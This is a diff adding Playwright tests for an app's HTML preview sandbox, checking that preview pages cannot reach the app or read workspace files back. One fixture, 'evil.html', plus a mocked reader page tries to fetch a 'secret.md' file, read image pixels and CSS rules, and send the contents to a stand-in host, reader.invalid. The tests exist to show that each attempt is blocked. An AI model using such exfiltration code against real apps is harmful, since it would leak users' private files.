@@ -101,7 +101,9 @@ test.describe('code viewer', () => {
       await expect(htmlPreview).toHaveAttribute('data-preview-kind', 'html');
       const frame = htmlPreview.locator('iframe.code-viewer-preview-frame');
       await expect(frame).toBeVisible();
-      await expect(frame).toHaveAttribute('sandbox', '');
+      // Scripts run, as in a browser; no origin, so nothing of the app's is in reach.
+      await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
+      await expect(frame).toHaveAttribute('src', /^noto-page:\/\/page\//);
       await expect(page.getByTestId('code-viewer-mode-toggle')).toHaveText('Source');
 
       await page.getByTestId('code-viewer-mode-toggle').click();
@@ -123,4 +125,105 @@ test.describe('code viewer', () => {
     }
   });
 
+
+  test('runs a page\'s own scripts and files beside it, with no reach into the app', async () => {
+    const workspace = path.join(resultRoot, 'page');
+    await rm(workspace, { recursive: true, force: true });
+    await mkdir(path.join(workspace, 'site'), { recursive: true });
+    await writeFile(path.join(workspace, 'site', 'map.html'), [
+      '<!doctype html><html><head><link rel="stylesheet" href="styles.css"><script src="data.js"></script></head>',
+      '<body><ul id="list"></ul><script>',
+      'for (const name of DATA) { const li = document.createElement("li"); li.textContent = name; document.getElementById("list").append(li); }',
+      'let reach = "blocked"; try { reach = parent.document.title; } catch {}',
+      'document.body.dataset.reach = reach;',
+      'fetch("noto://bundle/index.html").then(() => { document.body.dataset.fetched = "yes"; }, () => { document.body.dataset.fetched = "no"; });',
+      '</script></body></html>',
+    ].join('\n'), 'utf8');
+    await writeFile(path.join(workspace, 'site', 'data.js'), 'const DATA = ["Kafka", "Iceberg", "DuckDB"];\n', 'utf8');
+    await writeFile(path.join(workspace, 'site', 'styles.css'), 'li { color: rgb(226, 90, 28); }\n', 'utf8');
+    const { app, page } = await launch(workspace);
+    try {
+      await page.locator('[data-testid="tree-directory"][data-path$="site"], .tree-directory[data-path$="site"]').first().click();
+      await page.locator('[data-testid="tree-file"][data-path$="map.html"]').click();
+      await expect(page.getByTestId('code-viewer')).toHaveAttribute('data-preview-mode', 'preview');
+      await expect.poll(() => page.frames().some((frame) => frame.url().startsWith('noto-page://page/'))).toBe(true);
+      const frame = page.frames().find((candidate) => candidate.url().startsWith('noto-page://page/'))!;
+      await expect(frame.locator('li')).toHaveText(['Kafka', 'Iceberg', 'DuckDB']);
+      await expect(frame.locator('li').first()).toHaveCSS('color', 'rgb(226, 90, 28)');
+      await expect(frame.locator('body')).toHaveAttribute('data-reach', 'blocked');
+      await expect(frame.locator('body')).toHaveAttribute('data-fetched', 'no');
+    } finally {
+      await app.close();
+    }
+  });
+
+  test('lets nothing read a page\'s files back: not its own script, a web frame inside it, or an embed', async () => {
+    const workspace = path.join(resultRoot, 'page-reads');
+    await rm(workspace, { recursive: true, force: true });
+    await mkdir(workspace, { recursive: true });
+    await writeFile(path.join(workspace, 'secret.md'), 'VAULT-SECRET\n', 'utf8');
+    await writeFile(path.join(workspace, 'other.css'), 'x { color: red; }\n', 'utf8');
+    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAABCAIAAAB7QOjdAAAAEElEQVR4nGP4z8DAwMDAAAAPAgF/yvwh9QAAAABJRU5ErkJggg==', 'base64');
+    await writeFile(path.join(workspace, 'photo.png'), png);
+    await writeFile(path.join(workspace, 'evil.html'), [
+      '<!doctype html><body><script>',
+      'const base = location.href.replace(/[^/]*$/, "");',
+      'const mark = (k, v) => { document.body.dataset[k] = v; };',
+      'fetch(base + "secret.md").then(r => r.text()).then(t => mark("fetch", t), () => mark("fetch", "blocked"));',
+      'const img = new Image(); img.onload = () => { try { const c = document.createElement("canvas"); c.getContext("2d").drawImage(img, 0, 0); c.getContext("2d").getImageData(0, 0, 1, 1); mark("pixels", "read"); } catch { mark("pixels", "blocked"); } }; img.onerror = () => mark("pixels", "blocked"); img.src = base + "photo.png";',
+      'const l = document.createElement("link"); l.rel = "stylesheet"; l.href = base + "other.css"; l.onload = () => { try { mark("rules", l.sheet.cssRules[0].cssText); } catch { mark("rules", "blocked"); } }; l.onerror = () => mark("rules", "blocked"); document.head.append(l);',
+      'const f = document.createElement("iframe"); f.src = "https://reader.invalid/r.html#" + encodeURIComponent(base + "secret.md"); document.body.append(f);',
+      '</script></body>',
+    ].join('\n'), 'utf8');
+    const { app, page } = await launch(workspace);
+    try {
+      // The web, as a reader page that tries to read the file it is handed, and says what it got.
+      const read: string[] = [];
+      await app.evaluate(({ protocol }) => {
+        protocol.handle('https', async (request) => {
+          const url = new URL(request.url);
+          if (url.hostname !== 'reader.invalid') return new Response('', { status: 404 });
+          if (url.pathname === '/log') return new Response('', { status: 204 });
+          return new Response(`<script>fetch(decodeURIComponent(location.hash.slice(1))).then(r => r.text()).then(t => fetch('https://reader.invalid/log?' + encodeURIComponent('read ' + t)), () => fetch('https://reader.invalid/log?blocked'));</script>`, { headers: { 'Content-Type': 'text/html' } });
+        });
+      });
+      page.on('request', (request) => { if (request.url().startsWith('https://reader.invalid/log')) read.push(decodeURIComponent(new URL(request.url()).search.slice(1))); });
+      await page.locator('[data-testid="tree-file"][data-path$="evil.html"]').click();
+      await expect.poll(() => page.frames().some((frame) => frame.url().startsWith('noto-page://page/'))).toBe(true);
+      const frame = page.frames().find((candidate) => candidate.url().startsWith('noto-page://page/'))!;
+      // The address says nothing of where the folder is.
+      expect(frame.url()).not.toContain(encodeURIComponent(workspace));
+      const body = frame.locator('body');
+      await expect(body).toHaveAttribute('data-fetch', 'blocked');
+      await expect(body).toHaveAttribute('data-pixels', 'blocked');
+      await expect(body).toHaveAttribute('data-rules', 'blocked');
+      await expect.poll(() => read, { timeout: 10_000 }).toEqual(['blocked']);
+      // The page still shows the picture and applies the stylesheet; only reading them back is refused.
+      await expect(page.getByTestId('code-viewer-open-browser')).toBeVisible();
+    } finally {
+      await app.close();
+    }
+  });
+
+  test('lists the pictures in a folder, and shows one opened from the tree', async () => {
+    const workspace = path.join(resultRoot, 'pictures');
+    await rm(workspace, { recursive: true, force: true });
+    await mkdir(path.join(workspace, 'shots'), { recursive: true });
+    // A 2 by 1 PNG, red then blue.
+    const png = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAIAAAABCAIAAAB7QOjdAAAAEElEQVR4nGP4z8DAwMDAAAAPAgF/yvwh9QAAAABJRU5ErkJggg==', 'base64');
+    await writeFile(path.join(workspace, 'shots', 'one.png'), png);
+    await writeFile(path.join(workspace, 'shots', 'two.jpg'), png);
+    const { app, page } = await launch(workspace);
+    try {
+      await page.locator('[data-testid="tree-directory"][data-path$="shots"], .tree-directory[data-path$="shots"]').first().click();
+      await expect(page.locator('[data-testid="tree-file"][data-path$="one.png"]')).toBeVisible();
+      await expect(page.locator('[data-testid="tree-file"][data-path$="two.jpg"]')).toBeVisible();
+      await page.locator('[data-testid="tree-file"][data-path$="one.png"]').click();
+      const viewer = page.getByTestId('code-viewer');
+      await expect(viewer).toHaveAttribute('data-picture', '1');
+      await expect(page.getByTestId('picture-size')).toHaveText('2 × 1');
+    } finally {
+      await app.close();
+    }
+  });
 });
